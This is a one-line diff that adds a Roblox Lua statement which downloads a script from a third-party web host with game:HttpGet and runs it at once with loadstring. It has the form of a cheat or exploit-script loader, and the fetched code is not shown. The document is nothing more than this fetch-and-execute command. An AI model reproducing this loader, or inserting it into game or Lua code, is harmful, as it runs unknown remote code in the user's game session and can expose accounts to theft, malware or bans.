@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://lux-sever-top.lovable.app/api/public/script-raw/a3159df4-cb7e-44cd-bb5a-eea55e7f1604"))()
